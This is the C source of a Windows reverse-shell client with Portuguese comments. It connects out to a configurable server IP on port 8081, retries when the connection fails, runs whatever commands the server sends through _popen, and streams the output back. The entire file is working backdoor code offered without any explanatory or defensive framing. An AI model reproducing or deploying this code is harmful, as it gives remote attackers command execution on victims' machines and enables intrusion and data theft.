#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winsock2.h>
#include <direct.h>

#pragma comment(lib, "ws2_32")

#define SERVER_IP "127.0.0.1"  // Altere para o IP do servidor
#define PORT 8081
#define BUFFER_SIZE 4096
#define MAX_RETRIES 5          // Tentativas de reconexão

void execute_command(char *command, SOCKET sock) {
    FILE *fp;
    char buffer[BUFFER_SIZE];
    char path[BUFFER_SIZE];

    if (strncmp(command, "cd ", 3) == 0) {
        if (chdir(command + 3) != 0) {
            sprintf(buffer, "[!] Erro ao mudar de diretorio\n[CMD_END]\n");
            send(sock, buffer, strlen(buffer), 0);
        } else {
            getcwd(path, sizeof(path));
            sprintf(buffer, "[+] Diretorio alterado para: %s\n[CMD_END]\n", path);
            send(sock, buffer, strlen(buffer), 0);
        }
        return;
    }

    if (strcmp(command, "cd..") == 0) {
        if (chdir("..") != 0) {
            sprintf(buffer, "[!] Erro ao voltar diretorio\n[CMD_END]\n");
            send(sock, buffer, strlen(buffer), 0);
        } else {
            getcwd(path, sizeof(path));
            sprintf(buffer, "[+] Diretorio atual: %s\n[CMD_END]\n", path);
            send(sock, buffer, strlen(buffer), 0);
        }
        return;
    }

    if (strcmp(command, "pwd") == 0) {
        getcwd(path, sizeof(path));
        sprintf(buffer, "[+] Diretorio atual: %s\n[CMD_END]\n", path);
        send(sock, buffer, strlen(buffer), 0);
        return;
    }

    if (strcmp(command, "dir") == 0) {
        fp = _popen("dir", "r");
        if (fp == NULL) {
            sprintf(buffer, "[!] Erro ao listar arquivos\n[CMD_END]\n");
            send(sock, buffer, strlen(buffer), 0);
            return;
        }
        while (fgets(buffer, sizeof(buffer), fp) != NULL) {
            if (send(sock, buffer, strlen(buffer), 0) < 0) {
                break;  // Falha no envio
            }
        }
        _pclose(fp);
        send(sock, "[CMD_END]\n", 10, 0);
        return;
    }

    fp = _popen(command, "r");
    if (fp == NULL) {
        sprintf(buffer, "[!] Comando invalido\n[CMD_END]\n");
        send(sock, buffer, strlen(buffer), 0);
        return;
    }

    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        if (send(sock, buffer, strlen(buffer), 0) < 0) {
            break;  // Falha no envio
        }
    }
    _pclose(fp);
    send(sock, "[CMD_END]\n", 10, 0);
}

int connect_to_server(SOCKET *sock) {
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_port = htons(PORT);

    if (connect(*sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        return 0;  // Falha na conexão
    }
    return 1;  // Conexão bem-sucedida
}

int main() {
    WSADATA wsa;
    SOCKET sock;
    char server_reply[BUFFER_SIZE];
    int retries = 0;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("[!] Falha ao inicializar Winsock\n");
        return 1;
    }

    while (1) {
        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
            printf("[!] Falha ao criar socket\n");
            WSACleanup();
            return 1;
        }

        printf("[*] Tentando conectar ao servidor %s:%d...\n", SERVER_IP, PORT);
        if (connect_to_server(&sock)) {
            printf("[+] Conectado ao servidor!\n");
            retries = 0;  // Resetar tentativas após conexão bem-sucedida

            while (1) {
                memset(server_reply, 0, BUFFER_SIZE);
                int recv_size = recv(sock, server_reply, BUFFER_SIZE, 0);

                if (recv_size <= 0) {
                    printf("[!] Conexao perdida. Tentando reconectar...\n");
                    break;  // Sai do loop interno e tenta reconectar
                }

                if (strstr(server_reply, "exit") != NULL) {
                    printf("[*] Servidor encerrou a conexao.\n");
                    closesocket(sock);
                    WSACleanup();
                    return 0;
                }

                execute_command(server_reply, sock);
            }
        } else {
            retries++;
            printf("[!] Falha na conexao (%d/%d tentativas)\n", retries, MAX_RETRIES);
            if (retries >= MAX_RETRIES) {
                printf("[!] Nao foi possivel reconectar. Encerrando...\n");
                closesocket(sock);
                WSACleanup();
                return 1;
            }
            Sleep(3000);  // Espera 3 segundos antes de tentar novamente
        }

        closesocket(sock);
    }

    WSACleanup();
    return 0;
}